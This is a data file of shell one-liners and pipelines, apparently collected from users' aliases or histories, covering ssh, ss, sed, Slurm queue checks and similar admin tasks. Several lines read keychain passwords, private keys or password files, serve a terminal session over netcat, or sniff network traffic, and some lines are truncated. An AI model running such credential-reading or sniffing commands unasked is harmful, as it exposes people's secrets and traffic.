ssh sm-stage 'sudo tail -f /home/shapemix/rails/shapemix/transcode.out' | ColorizeBlueOnBlack
ssh simplesite@getsimplesite.com pg_dump -Fc --no-acl --no-owner simplesite_production | pg_restore --verbose --clean --no-acl --no-owner -d simplesite_development
ssh simpleform@getsimpleform.com pg_dump -Fc --no-acl --no-owner simpleform_production | pg_restore --verbose --clean --no-acl --no-owner -d simpleform_development
ssh servers | grep -A2 app_production
ssh servers | grep -A2 app_alpha
ssh s5pis 'ps aux | grep h1505-mib'
ssh pot cat .flipclip | xclip -selection clipboard && echo Clipboard now: $(xclip -selection clipboard -o)
ssh michaelatutterrow@cs.lewisu.edu; echo 230024174 | pbcopy
ssh li 'top -bn 1 | head -n 5'
ssh lego-dev.dev.yandex-team.ru -R :8088:`localhost`:8080 -N | python -m SimpleHTTPServer 8080
ssh jwiens@h.ia.io /var/www/rc/rcfiles.sh|tar -wzxvC ~/
ssh itsbl006890i.olatheks.org pveca -l|awk
ssh it-admin dig -t axfr internal.sanger.ac.uk | grep $2
ssh indra /usr/local/sbin/5pquarter | lp -d5p_raw
ssh ig1-sve-01 cat /etc/bind/zones.pri/net/db.sadm.ig-1.net | less
ssh git.shure.com gerrit show-queue | grep tasks
ssh formation@serveur -p 2200$(echo $HOSTNAME | tail -c2)
ssh elf@staging.washcyclelaundry.com pg_dump -Fc --no-acl --no-owner elf_staging --exclude-table=page_requests | pg_restore --verbose --clean --no-acl --no-owner -d elf_development
ssh ec2-user@prod_ops wpa/pqstatus.sh|grep rows
ssh ec2 sudo tcpdump -U -s0 -w - 'not port 22' | wireshark -k -i -
ssh build-manager@124.153.102.70 | echo
ssh bastion ssh saltmaster sudo journalctl --follow --lines=10000 | grep pull-and-run
ssh auto tcpdump -i eth1 -n -s 0 -U -w - | wireshark -k -i -
ssh anvil ps -ef | grep jla
ssh alert11 tail -F /iad/finn/search-pushnotifier/logs/search-pushnotifier.log | grep --line-buffered monitor
ssh admin@ca-qa.gofinanceit.com 'mysqldump -u root financeit_ca_qa | gzip -f -9' > financeit_ca_qa.`date +%Y%m%d`.sql.gz
ssh adam@adam 'ffmpeg -r 5 -f x11grab -s 1366x768 -i :0.0 -b:v 4000k -f flv -' | ffplay -
ssh `host rmm-p1186948 |awk '{print
ssh `echo $SSH_CLIENT | awk '{print $1}'` pbpaste
ssh `echo $SSH_CLIENT | awk '{print $1}'` pbcopy
ssh `echo $SSH_CLIENT | awk '{print
ssh `arp -n | awk 'NR==2{print $1}'`
ssh 10.66.242.99 ls -l /var/www/releases | grep current
ssh 10.64.44.92 ls -l /var/www/releases | grep current
ssh -x jb-linux.darienlibrary.org tmux show-buffer | pbcopy -i
ssh -t ec2-user@$host docker ps G $f | awk '{print $1}'
ssh -o StrictHostKeyChecking=no -i ~/.ssh/local_machine ${LOCAL_MACHINE_USER}@$(echo $SSH_CONNECTION | awk '{print $1}')
ssh -i ~/.ssh/node-abcd.pem node@ice.adslot.com 'cd /home/node/direct-web-dev2/data; tar cz --exclude=adslot*target *' | tar xzv -C ~/Projects/direct-web/data
ssh -i ~/.ssh/node-abcd.pem node@abcd-demo.adslot.com 'cd /home/node/direct-web/data; tar cz --exclude=adslot*target *' | tar xzv -C ~/Projects/direct-web/data
ssh -f -N -C -L 10000:localhost:3306 a12609@172.17.242.91 -p 22;ps ax | grep ssh
ssh -e\|
ssh -b \$(ifconfig en0 | grep \
ssh -L 9200:localhost:9200 -L 9300:localhost:9300 $(optica role=wharf-elasticsearch-test-master$ | head -1)
ssh -L 9200:localhost:9200 -L 9300:localhost:9300 $(optica role=wharf-elasticsearch-i3-master$ | head -1)
ssh -D 5555 -f -N hawo && sleep 1 && export SSH_PID=\`pgrep -l '^ssh\$' | awk '{print \$1;}'\` && printf '\n\tSET UP NETWORK PROXY WITH SOCKS HOST: \
ssh -C irlaeng10.corp.irise.com tmux save-buffer - | pbcopy
ssh $staging1ip ls -l /var/www/releases | grep current
ssh $prodip ls -l /var/www/releases | grep current
ssh $REMOTEHOST ffmpeg -an -f video4linux2 -s 640x480 -i /dev/video0 -r 10 -b:v 500k -f matroska - | mplayer - -idle -demuxer matroska
ssh $(optica role=upshot-druid-worker-v2-staging | tail -n 1)
ssh $(optica role=upshot-druid-master-v2-staging | tail -n 1)
ssh $(optica role=upshot-druid-broker-v2-staging | tail -n 1)
ssh $(optica role=scram-runner-staging | tail -n 1)
ssh $(optica role=scram-runner-b | tail -n 1)
ssh $(optica role=scram-runner-b | sed -n 3p)
ssh $(optica role=scram-runner-b | sed -n 2p)
ssh $(optica role=scram-runner-b | sed -n 1p)
ssh $(optica role=scram-runner-a | tail -n 1)
ssh $(optica role=scram-flink-taskmanager-staging | tail -n 1)
ssh $(optica role=scram-flink-taskmanager-b | tail -n 1)
ssh $(optica role=scram-flink-taskmanager-a | tail -n 1)
ssh $(optica role=scram-flink-jobmanager-staging | tail -n 1)
ssh $(optica role=scram-flink-jobmanager-b | tail -n 1)
ssh $(optica role=scram-flink-jobmanager-b | sed -n 2p)
ssh $(optica role=scram-flink-jobmanager-b | sed -n 1p)
ssh $(optica role=scram-flink-jobmanager-a | tail -n 1)
ssh $(optica role=kafka-observability-internal | tail -n 1)
ssh $(li | awk
ssh $(host -t A $1 | cut -f1 -d' ')
ssh $(dig +short worker.in.custora.com | head -1)
ssh $(cat ~/.ssh/list.tky00_cocotsure | peco)
ss | grep tcp
ss | cut -c 9-
ss -tunalp | column -t
ss -tunalp | cat
ss -tulpn | grep
ss -tulpn | column -t
ss -tulpn | cat
ss -tulanp | less
ss -tnpel | column -t
ss -tnp | column -t
ss -tlpn | grep
ss -tlnup |grep
ss -tarp | sed -e 's/ *$//'
ss -tar | sed -e 's/ *$//'
ss -tapen | awk
ss -tap | sed -e 's/ *$//'
ss -tanp | grep
ss -ta | sed -e 's/ *$//'
ss -rota | less
ss -punta | grep
ss -pantu | column -t
ss -p | grep STA
ss -nutlp | grep mongo
ss -ntl | php -B
ss -npl | grep 3000
ss -ltp | grep
ss -lp | column
ss -lnpt | grep
ss -l | grep LISTEN
ss -l -p -n | grep
ss -anupl | column -t
ss -anup | grep
ss -antp | grep LISTEN
ss -antp | grep
ss -anptl | column -t
ss -4p|column -t
ss --all --numeric --processes --ipv4 --ipv6 | column -t
srm' | tee -a $RC
srcb; cdcbz; ./gazebo-arm.sh | tee /home/workspace/RoboND-Home-Service-Robot/tests/$(date +%a%H:%M:%S).txt
srcb; cdcbz; ./gazebo-arm.sh | tee /home/workspace/RoboND-DeepRL-Project/tests/$(date +%a%H:%M:%S).txt
sr -elvi|less
sr -elvi | less
squeue2 | grep jsartor7
squeue2 | grep gpu
squeue | grep youdongz
squeue | grep serial
squeue | grep bigmem
squeue | grep are
squeue | grep 'elk72'
squeue | grep $USER
squeue | grep
squeue | awk '{print \$4 \
squeue -u yaraujjo | cat -n
squeue -l --format='%.9i %.9q %.40j %.18u %.9b %.6D %.6N %.15L' | grep $(whoami)
squeue --start --format='%.7i %.7Q %.14q %6P %.15j %.12u %.10a %.20S %.6D %.5C %R' --sort=S --states=PENDING | sed '/\:/!d'
sqlite3 ~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV* 'select LSQuarantineDataURLString from LSQuarantineEvent' | sort
sqlite3 ~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV* 'select LSQuarantineDataURLString from LSQuarantineEvent' | less
sqlite3 ~/Library/Mail/Envelope\ Index vacuum | echo 'done'
sqlite3 -header -separator ' | '
sqlformat - --reindent --reindent_aligned --keywords lower | awk NF
sqldeveloper &>/dev/null &|
sq | grep gpu:p40
sq | grep gpu:p100
sq | grep $(whoami)
sq | awk
spubkey | xclip -selection clipboard
sprunge | xcopy
sprivkey | xclip -selection clipboard
spring stop && ps ax | grep -e \
spring rake routes |grep
spotify status; spotify share | head -n 2
spotify &|
spip list --outdated --format=freeze | grep -v
spin serve -Itest | highlight red ' [1-9]0* failures' purple '[_a-zA-Z0-9]*\.rb.[0-9]*' red 'Error:' red 'Failure:' red ' [1-9]0* errors' green ' 0 errors' green ' 0 failures'
speedtest-cli | egrep --color=never \
speedtest | lolcat
speedtest --simple | tail -n 2
spectrum_ls | head -n 17
spectrum_bls | head -n 17
space-images | grep -i
sox -d -n trim 0 .1 noiseprof|sox -d -d noisered
source-highlight -f esc --lang-def=vcf.lang --outlang-def=bioSyntax-vcf.outlang --style-file=vcf.style | less
source-highlight -f esc --lang-def=sam.lang --outlang-def=bioSyntax.outlang --style-file=sam.style | less
source-highlight -f esc --lang-def=pdb.lang --outlang-def=bioSyntax-vcf.outlang --style-file=pdb.style | less
source-highlight -f esc --lang-def=gtf.lang --outlang-def=bioSyntax-vcf.outlang --style-file=vcf.style | less
source-highlight -f esc --lang-def=flagstat.lang --outlang-def=bioSyntax.outlang --style-file=sam.style | less
source-highlight -f esc --lang-def=fastq.lang --outlang-def=bioSyntax.outlang --style-file=fasta.style | less
source-highlight -f esc --lang-def=fasta.lang --outlang-def=bioSyntax.outlang --style-file=fasta.style | less
source-highlight -f esc --lang-def=faidx.lang --outlang-def=bioSyntax.outlang --style-file=sam.style | less
source-highlight -f esc --lang-def=clustal.lang --outlang-def=bioSyntax.outlang --style-file=fasta.style | less
source-highlight -f esc --lang-def=bed.lang --outlang-def=bioSyntax.outlang --style-file=sam.style | less
source-highlight -f esc --lang-def=$HIGHLIGHT/vcf.lang --outlang-def=$HIGHLIGHT/bioSyntax-vcf.outlang --style-file=$HIGHLIGHT/vcf.style | bless
source-highlight -f esc --lang-def=$HIGHLIGHT/sam.lang --outlang-def=$HIGHLIGHT/bioSyntax.outlang --style-file=$HIGHLIGHT/sam.style | bless
source-highlight -f esc --lang-def=$HIGHLIGHT/pdb.lang --outlang-def=$HIGHLIGHT/bioSyntax-vcf.outlang --style-file=$HIGHLIGHT/pdb.style | bless
source-highlight -f esc --lang-def=$HIGHLIGHT/gtf.lang --outlang-def=$HIGHLIGHT/bioSyntax-vcf.outlang --style-file=$HIGHLIGHT/vcf.style | bless
source-highlight -f esc --lang-def=$HIGHLIGHT/flagstat.lang --outlang-def=$HIGHLIGHT/bioSyntax.outlang --style-file=$HIGHLIGHT/sam.style | bless
source-highlight -f esc --lang-def=$HIGHLIGHT/fastq.lang --outlang-def=$HIGHLIGHT/bioSyntax.outlang --style-file=$HIGHLIGHT/fasta.style | bless
source-highlight -f esc --lang-def=$HIGHLIGHT/fasta.lang --outlang-def=$HIGHLIGHT/bioSyntax.outlang --style-file=$HIGHLIGHT/fasta.style | bless
source-highlight -f esc --lang-def=$HIGHLIGHT/faidx.lang --outlang-def=$HIGHLIGHT/bioSyntax.outlang --style-file=$HIGHLIGHT/sam.style | bless
source-highlight -f esc --lang-def=$HIGHLIGHT/clustal.lang --outlang-def=$HIGHLIGHT/bioSyntax.outlang --style-file=$HIGHLIGHT/fasta.style | bless
source-highlight -f esc --lang-def=$HIGHLIGHT/bed.lang --outlang-def=$HIGHLIGHT/bioSyntax.outlang --style-file=$HIGHLIGHT/sam.style | bless
source-highlight --failsafe --infer-lang -f esc | less
source ~/.zshrc | echo \
source ~/.bashrc | echo now executing ~/.bashrc
source `find . -name activate | head -n1`
source `find . -name activate -type f|head -1)`
source \$((echo ~/.bashrc && echo ~/.bash_profile)|peco)
source /opt/Xilinx/$(ls -1 /opt/Xilinx/ | head)/ISE_DS/settings64.sh
source /Users/pegasus/Program/py3.5_test/bin/activate;fswatch -o ./*.py | xargs -n1 ./runtest.sh
source $(ls | grep env)/bin/activate
sort|uniq -c
sort|uniq
sort ~/.bash_history | uniq > ~/.bash_history.tmp && mv ~/.bash_history.tmp ~/.bash_history
sort |uniq
sort | uniq -c
sort | uniq
sort | less
sort | awk ' { a[i++]=$1; } END { print a[int(i/2)]; }'
sort | addwidths
sort | \
sort |
sort <(fc-list : family) | vim -
sort -u | less
sort -n | uniq -c
sort -n | tee dcmConvert_cenc.cfg"
sort -n | awk
sort $bmk_file | awk 'BEGIN { FS =
snmpd -Dread_config -H 2>&1 | grep
snb | cut -c -$COLUMNS
snap run spotify -force-device-scale-factor=1.75 >/dev/null 2>&1 &|
snakemake -l | tr '\n' ' '
snakemake --rulegraph | graph-easy --as boxart
sn | cut -c 9-
sm | cut -c 9-
slurp | grim -g - -
slurp | grim -g -
sleep 3 && cat /home/adele/.config/i3/pass | sudo -S dfu-util -D left_kiibohd.dfu.bin
sleep 2; gnome-screenshot -ac; xclip -selection clipboard -t image/png -o > /tmp/_pbcopy_tesseract.png ; tesseract /tmp/_pbcopy_tesseract.png /tmp/_pbcopy_tesseract --l eng > /dev/null; sleep 2; cat /tmp/_pbcopy_tesseract.txt | pbcopy
sleep 1; p | { read text; xdotool type $text; }
sleep 1 ; xwd | convert xwd:-
sleep 1 && sudo shutdown -h now | sudo systemctl stop slim
slack | wapp
sl |lolcat
sl | lolcat
sl --help|lolcat
size(){ du -sh $1* | sort -hr; }; size
sixel-test | __tmux_guard
sitename | command grep -q nahpc
sitename | command grep -q euhpc
sinfo |grep idle
sinfo | grep idle
sinfo -l | grep idle
shw | fzf
shuf -n4 /usr/share/dict/words | tr -d
shuf -n 2 /usr/share/dict/words | tr -dc 'A-Za-z0-9'
shuf -n 1 ~/Desktop/erossignonQuotes.txt | cowsay -f stegosaurus
shuf -n 1 ~/Desktop/WriteMonkeyQuotes.txt | cowsay -s
shuf -n 1 ~/Desktop/WriteMonkeyQuotes.txt | cowsay -f stegosaurus
shuf -n 1 gre.txt | cowsay
shuf -n 1 $HOME/thoughts.txt | cowsay
shuf -n $[$RANDOM % 10] /usr/share/dict/words | tr '\n' ' '
shuf - | head -n1
shuf ${HOME}/.ircnames|head -1
showxcinfo | pbcopy
showrgb | less
showq | grep tdubois
showq | grep $USER
showq -l|grep serial
showq -l|grep development
showfigfonts | less
showconf | grep nodeID
show_which lm && la | more
show_changelog.sh -nodevs | less
show_changelog.sh -nodevs -all | less
show-merged-branches | xargs -n 1 git branch -d
shopt|grep
sha256sum -c SHA256SUMS 2>&1 | grep OK
sha256sum -c < ~/code/systemsums.txt |grep FAILED
sha256 -c < ~/code/systemsums.txt |grep FAILED
sh8 | head -c 7 && echo
sh ~/tools/lgtm.sh/lgtm.sh -m | pbcopy
sh ~/tbash/find_path.sh | grep
sh ~/.scripts/restore | grep errors
sh ~/.scripts/dropbox | grep errors
sh vgs.sh | grep -v ##
sh local.sh 2>&1 | tee err.log
sh colors.sh | less -r
sh /usr/local/bin/com | lolcat
sh ./build-kernel -gt 8 2>&1 | tee ~/gcc-build-kernel.txt
sh ./build-kernel -c -gt 8 2>&1 | tee ~/clang-build-kernel.txt
sh -c 'git ls-files --deleted | xargs -r git rm'
sh -c 'git branch --no-color 2> /dev/null' | sed -e '/^[^*]/d' -e 's/* \(.*\)/(\1)/'
sh -c 'du -hs .[^.]* err.txt generated.file succ.txt | sort -rh'
sfcd | grep
sf *.go|xargs gofmt -w
sex | cow
set|grep -i -E
set|grep -a
set|grep
setxkbmap -query | grep layout
setxkbmap $(setxkbmap -query | grep
setsid $HOME/Android/Sdk/emulator/emulator @$(/home/philipp/Android/Sdk/emulator/emulator -list-avds | fzf)
setopt extended_glob ksh_glob glob_dots;vim ^(.git|node*)/**/*(.) *(.)
setopt dotglob; du -shc ./err.txt ./generated.file ./succ.txt | sort -hr;unsetopt dotglob
setopt completealiases; config diff | bat --style=numbers -l diff
set |grep OS_
set |egrep -i
set | sort
set | m
set | less
set | grep NKBLD
set | grep DB_DEFAULT_URL=
set | grep -i PATH
set | grep -e HZ_TCP_ENABLED= -e EVOLUTIONS_ENABLED= -e VICTIV_OPTS= -e DB_DEFAULT_URL=
set | grep
set | fgrep \
set | egrep ^[a-z0-9]+=.*$
set | egrep '^COLOR_\w*'
set | egrep '^COLOR_\\w*'
set | egrep 'COLOR_w*'
set | egrep 'COLOR_\w*='
set | egrep 'COLOR_\w*'
set | egrep 'COLOR_\\w*'
set | egrep 'CLR_\w*'
set | \less -R
set 2>/dev/null | vless
set 2>/dev/null | \less -R
set -o | sed -e 's/^no\(.*\)on$/\1 off/' -e 's/^no\(.*\)off$/\1 on/'
set -o | grep --color=always
set -o | grep
set -o posix; set | grep CLARIFAI; set +o posix
set -f; _f() { echo $@ | bc; set +f; }; _f
set -e; for foo in *.zip; do D=$(echo $foo | sed
set -e; for foo in *.rar; do D=$(echo $foo | sed
set -e 's/<[^>]*>//g' $1 | wc -m
sess=$(tmux ls -F#S|tail -1);tmux a -t ${sess:-0}
services | grep user --color=never
services | grep root --color=never
services | grep bebanjo --color=never
service httpd stop | true && service nginx start && service mongod stop && service mongod start
service NetworkManager status ; chkconfig | grep Net ; cat /etc/resolv.conf ; cat /etc/sysconfig/network-scripts/ifcfg-eth0
service --status-all | grep +
service --status-all | egrep \\+
serve -s build | ngrok http 5000
seq 20 | shuf
seq 2 | xargs -Iz sudo vpnc-disconnect;
seq 10 | xargs -n 1 -P 10 -I NUMBER bash -c 'python3 clis/square.py --number NUMBER'
seq 10 | xargs -Iz sl
seq 1 1000 | xargs -I {}
seq 1 100 | xargs -I {}
seq 1 100 | sort -R
seq 1 10 | xargs -I {}
seq 1 $(sysctl -n hw.ncpu) | xargs -n 1 -P $(sysctl -n hw.ncpu) yes > /dev/null
seq -s= 50 | tr -d [:digit:]
sensors|grep -oE 'fan1+\:+\s+[0-9]+\s+[A-Z]+.'
sensors|grep '^Core.*?°C' -P
sensors |grep Core
sensors | grep sensor\ =
sensors | grep Core
sensors | grep -e Core -e Physical
sensors | grep
sensors | awk '/Core/ { printf(\
sendmail -d0.4 -bv root |less
semver `git tag | tail -n 1` -i
seetsv | less -S
sed 9!d CHEATS | xclip; echo \
sed 8!d CHEATS | xclip; echo \
sed 7!d CHEATS | xclip; echo \
sed 6!d CHEATS | xclip; echo \
sed 5!d CHEATS | xclip; echo \
sed 4!d CHEATS | xclip; echo \
sed 30!d CHEATS | xclip; echo \
sed 3!d CHEATS | xclip; echo \
sed 29!d CHEATS | xclip; echo \
sed 28!d CHEATS | xclip; echo \
sed 27!d CHEATS | xclip; echo \
sed 26!d CHEATS | xclip; echo \
sed 25!d CHEATS | xclip; echo \
sed 24!d CHEATS | xclip; echo \
sed 23!d CHEATS | xclip; echo \
sed 22!d CHEATS | xclip; echo \
sed 21!d CHEATS | xclip; echo \
sed 20!d CHEATS | xclip; echo \
sed 2!d CHEATS | xclip; echo \
sed 1d | sed 's/\s.*$//'
sed 19!d CHEATS | xclip; echo \
sed 18!d CHEATS | xclip; echo \
sed 17!d CHEATS | xclip; echo \
sed 16!d CHEATS | xclip; echo \
sed 15!d CHEATS | xclip; echo \
sed 14!d CHEATS | xclip; echo \
sed 13!d CHEATS | xclip; echo \
sed 12!d CHEATS | xclip; echo \
sed 11!d CHEATS | xclip; echo \
sed 10!d CHEATS | xclip; echo \
sed 1!d CHEATS | xclip; echo \
sed -u 's/.*app\[web\..*\]\: //' | bunyan
sed -rn 's|.*\
sed -r 's/σ([^[:alpha:]]|$)/ς\1'/g
sed -r 's/([A-Z])/_\L\1/g' | sed 's/^_//'
sed -r 's/((^|[[:blank:]])[[:alpha:]])([[:alpha:]]*)/\U\1\L\3/g'
sed -r '/^(\s*#|$)/d;'
sed -ne ':^;N;\$!b^;s/\n/|/g p'
sed -ne ':.;\$p;:^;N;\$!b^;s/\n/|/g; t.;'
sed -ne '/^Package: \(.*\)/{s//\1/;h;};/^Installed-Size: \(.*\)/{s//\1/;G;s/\n/ /;p;}' /var/lib/dpkg/status | sort -rn
sed -n '/^[-+]/{s/^.[[:blank:]]*(\([^)]*\))?[[:blank:]]*//s/[[:blank:]]*[;{][[:blank:]]*$//s/:[^:]*([[:blank:]]|$)/:/gp}' *.m
sed -e 's/url: //' -n -e '/https/p' | \\
sed -e 's/^\[[^]]*\] //' | perl -MAthena::Lib -MJSON::XS -ne 'my \$json = \$_; my \$decode; eval { \$decode = decode_json(\$json); }; print(JSON::XS->new->pretty(1)->encode(\$decode)) unless \$@; '
sed -e 's/^[[:space:]]*//' | sed -e 's/[[:space:]]*$//'
sed -e 's/.\{'$(($COLUMNS/2-4))'\}/&\n/g' | column
sed -e 's/%/\\\\x/g' | python -c \
sed -e '/^---/s/^\(.*\)/[1m\1[0m/' -e '/^+++/s/^\(.*\)/[1m\1[0m/' -e '/^@@/s/^\(.*\)/[1m\1[0m/' -e '/^-/s/^\(.*\)/[31m\1[0m/' -e '/^\+/s/^\(.*\)/[32m\1[0m/' | less -C -R $@
sed -e '/^#\|^$/d'
sed -e '/^#.*$/d' -e '/^$/d' < httpd.conf | less
sed -e ""s_[0-9]*%_\x1b[32m&\x1b[0m_"" |\
sed -e ""s_[.,0-9]*[MG]_\x1b[36m&\x1b[0m_"" |\
sed -e ""s_[,0-9]*[MG]_\x1b[36m&\x1b[0m_"" |\
sed -e ""s_9[0-9]%_\x1b[31m&\x1b[0m_"" |\
sed -e ""s_/dev/sdb[1-9]_\x1b[33m&\x1b[0m_"" |\
sed -e ""s_/dev/sda[1-9]_\x1b[35m&\x1b[0m_"" |\
sed -e ""s_/dev/sda[1-9]_\x1b[34m&\x1b[0m_"" |\
sed -e ""s_/dev/sd[c-z][1-9]_\x1b[37m&\x1b[0m_"" |\
sed -e ""s_/dev/sd[b-z][1-9]_\x1b[33m&\x1b[0m_"" |\
sed -e ""s/ /\n/g"" | ctags -R -L -"
sed -Ez '$ s/\\n+\$//' | xclip -selection clipboard -in
sed -E 's/^[ \t]+//g' | ansible-vault decrypt 2>/dev/null
sed -E 's/(.*)/\1 https:\/\/en\.wikipedia\.org\/w\/index\.php\?title=Special:Search\&search=\1/' | sed -E 's/ /\+/g'
sed 's/~\/Projects\/testbed\/testbed-seneca--4//g' | \
sed 's/trace=\[/ \x1b[31;1mTRACE::\x1b[39;49m/g' | \
sed 's/trace=/\n\ntrace=/g'| \
sed 's/node_modules/\[nm\]/g' | \
sed 's/native=false\],/native=false\],\n _______________________________________________________________________________________________________________________/g' | \
sed 's/anonymous function/lambda/g' | \
sed 's/^zend_extension/;zend_extension/' /etc/php/conf.d/xdebug.ini | sudo tee /etc/php/conf.d/xdebug.ini &> /dev/null; sudo systemctl restart httpd
sed 's/^\s*//g' | sed 's/\s*$//g'
sed 's/^\\([^:]*\\):.*\$/\\1/' | sort -u
sed 's/^\([0-9][0-9]\).*$/\1/g;s/\([0-9]\)/\1 /g;s/[Aa]/10 /g;s/[Bb]/11 /g;s/[Cc]/12 /g;s/[Dd]/13 /g;s/[Ee]/14 /g;s/[Ff]/15 /g' | awk '{ print (\$1*16)+\$2 }'
sed 's/^\( \)\(\[.*Error: .*,\)/\n\1\x1B[4;32m\2\x1b[0;39;49m/g' | \
sed 's/^\ *//' | sed 's/\ *$//'
sed 's/^[ \*]*//g' | grep -E '^\w+/\w$'
sed 's/^;zend_extension/zend_extension/' /etc/php/conf.d/xdebug.ini | sudo tee /etc/php/conf.d/xdebug.ini &> /dev/null; sudo systemctl restart httpd
sed 's/^.*\///' | \
sed 's/^-/\x1b[31m-/;s/^+/\x1b[32m+/;s/^@/\x1b[34m@/;s/$/\x1b[0m/' | less -R
sed 's/^ *//' | sed -e 's/ */\t/1'
sed 's/^ *//' | sed 's/ *$//'
sed 's/\^\[/\o33/g;s/\[1G\[/\[27G\[/' /var/log/boot | less -r
sed 's/\\\u\(....\)/\&#x\1;/g' | nkf --numchar-input -w
sed 's/\\\\/\\\\\\\\/g'|xargs -I{} echo -e {}
sed 's/\\\040/ /g' ~/.mysql_history|grep
sed 's/[\x01-\x1F\x7F]//g' | iconv -c -t ascii
sed 's/PASS/${fg[green]}PASS${reset_color}/' | sed 's/FAIL/${fg[red]}FAIL${reset_color}/'
sed 's/:.*//;/^[[:space:]]*$/d' | sort -u
sed 's/, version=/,\n version=/g' | \
sed 's/, uptime=/,\n uptime=/g' | \
sed 's/, uid=/,\n uid=/g' | \
sed 's/, stack=/,\n /g' | \
sed 's/, rss=/,\n rss=/g' | \
sed 's/, pid=/,\n pid=/g' | \
sed 's/, loadavg=/,\n loadargv=/g' | \
sed 's/, line=/,\n \\\----> LINE = /g' | \
sed 's/, heapUsed=/,\n heapUsed=/g' | \
sed 's/, heapTotal=/,\n heapTotal=/g' | \
sed 's/, gid=/,\n gid=/g' | \
sed 's/, execPath=/,\n execPath=/g' | \
sed 's/, cwd=/,\n cwd=/g' | \
sed 's/, argv=/,\n argv=/g' | \
sed 's/%/\\\\x/g' | xargs -0 printf '%b'
sed 's/$/@latest/' | xargs yarn add
sed 's/$/@latest/' | xargs npm install
sed 's/ date=/\n date=/g' | \
sed 'N;s/\n/ /' | \
sed '0~34 s/$/\n\n---\n\n/g' $SCRIPTPATH/help.md | mdp
sed '/^\s*$/d' | wc -l
sed $'s#\e[\[(][[:digit:]]*[[:print:]]##g'|strings
sed ""s/^alias\.//"" |
security find-generic-password -ga labnol | grep password
security find-generic-password -ga 'Linkem2.4GHz_920359' | grep 'password:'
security find-generic-password -ga 'Cookiesoft 2.4' | grep 'password:'
secrets cat secrets://ops/cloudbees/nagios/admin.json.gpg | jq '.password' -r
secret-tool lookup keepass password | keepassxc $HOME/.keepass/passwords.kdbx --pw-stdin
secret-tool lookup ist pass | kinit $(secret-tool lookup ist user) > /dev/null
searchtext|fzy -l 25
searchproject .|fzy -l 25
searchnotes .|fzy -l 25
searchnotes .|fzs
searchnotes .|fzftv
searchfiles|open_in_app
searchfilesraw|fzy -l 20
searchfilesraw|fzft
searchcommands|clip
searchall .|fzy -l 25
searchInRecentfiles .|fzft
searchInRecentfiles .|fzf
sdate|sed 's/.*\([0-9][0-9][0-9][0-9]\) .*/\1/'
sd | cut -c 9-
sd images | awk '{print \
scutil --proxy | grep '^\ '
scutil --dns | head -n 10; tail /etc/resolv.conf
scutil --dns | head
scutil --dns | grep nameserver
scutil --dns | grep 'nameserver\\[[0-9]*\\]'
scutil --dns | grep 'nameserver\[[0-9]*\]'
scselect air | networksetup -setairportpower en0 on
scriptInfoPerl | grep
script -qf | tee >(nc -kl 5000)
screenfetch|lolcat
screenfetch | lolcat -t
screenfetch | lolcat
screenfetch 2> /dev/null | lolcat
screenfetch -nN -E | cowsay -W 72
screencapture -i ~/tmp/screenshot.png && tesseract ~/tmp/screenshot.png stdout | pbcopy && rm -f ~/tmp/screenshot.png
screen /dev/$(ls /dev/ | grep ttyACM)
screen /dev/$(basename $(ls /dev/ttyAC*|tail -1)) 9600n
screen -t log sudo cat /var/log/everything.log | tail
screen -ls|grep
screen -ls | grep \
screen -ls | grep A
scp shallowhal:$(ssh shallowhal ls -dt /data/db/cms*sql* | head -1) /home/jorenza/Downloads/cmsdb/cms.sql.Z
scp .ssh/id_rsa.pub | ssh skylab@192.168.1.5:/home/ubuntu/.ssh/authorized_keys
scp -l 8192 backups@bluebucket.onepercentclub.com:/home/backups/saas-backups/saas/reef-prod-current.sql.bz2 ./; dropdb $SAAS_DB; createdb $SAAS_DB; bzcat reef-prod-current.sql.bz2 | psql $SAAS_DB; rm reef-prod-current.sql.bz2; echo \
scp $(type ssh_build | cut -d' ' -f7):~/screenshot.png ~/.state/vmass_vagrant.png && open -a Finder ~/.state/vmass_vagrant.png
scontrol show jobid -d | /mnt/hds/proj/bioinfo/SCRIPTS/jobinfo.pl -u $USER
scontrol show jobid -d | /mnt/hds/proj/bioinfo/SCRIPTS/jobinfo.pl
scontrol -o show nodes | awk
scanimage|convert pnm:-
scanimage --format=tiff --resolution 300 | convert -density 300 -
sc | cut -c 9-
sb | tr -d 'feature/'
save_history cd $(ghq root)/$(ghq list | filter)
sauerbraten-client 2>&1 | tee -a ~/space/sauerbraten/log.txt
sar -u 2 1 | tail -n 1
sandiego-images | grep -i
samtools view -b - | samtools sort -o - booyah
salita --update | tee ./pack_updated.log; npm dedupe; npm up -d; npm i ./ -d; npm up -d; npm-check
salita --update | tee ./pack_updated.log; npm dedupe; npm up -d; npm i ./ -d; npm dedupe; npm rebuild; npm-check -u
sake dev/build | grep +
safepaste | $VIM_COMMAND -
sacct | tail
sacct | grep
sa | cut -c 9-
s | less
s | grep -i
s tcpdump -i eth0 -n -s 0 -w - | grep -a -o -E \
s ngrep -d 'eth0' -t '^(GET|POST) ' 'tcp and port 80'
s log|less
s log 2>/dev/null|head -20
s \$(fc -l \$[ \$(print -P '%\!') - 1 ] | cut -d' ' -f3-)
s $(git ls-files | peco)
r|less
rvm list gemsets | grep =
rvm info | grep GEM_HOME
run_and_tell ls -lAt | tail
run_and_tell ls -lAt | head
run_and_tell ls -l | sed -e 's/--x/1/g' -e 's/-w-/2/g' -e 's/-wx/3/g' -e 's/r--/4/g' -e 's/r-x/5/g' -e 's/rw-/6/g' -e 's/rwx/7/g' -e 's/---/0/g'
run_and_tell 'git status -s | grep UU --color=auto'
ruby ~/scripts/check_before_commit.rb|less -f -R
ruby -v|cut -d' ' -f2
ruby -v && gem env | grep gems
ruby -ryaml -rjson -e 'puts YAML.dump(JSON.parse(STDIN.read))' | yaml
ruby -rsecurerandom -e 'print SecureRandom.hex(32)' | pbcopy; echo '32-byte hex secret copied to clipboard!'
ruby -r json -e 'jj JSON.parse gets' | hilite -SJSON
ruby -pe 'chomp' | pbcopy
ruby -e 't = \`ps aux |grep spring\`; puts t.split(\
ruby -e '\`ps aux | grep rails\`.split(\
rubocop -a $(git diff master.. --name-only | xargs ls -d 2>/dev/null)
rubocop $(git diff master --name-only | grep
rtxmlrpc system.listMethods | egrep
rtorrent -b \$(ip address show dev tun0 | awk '/inet / { print \$2 }')
rtmpdump -v -r rtmp://us.videocdn.scaleengine.net/jblive-origin/jblive/jblive | mplayer -cache 1000 -vo xv
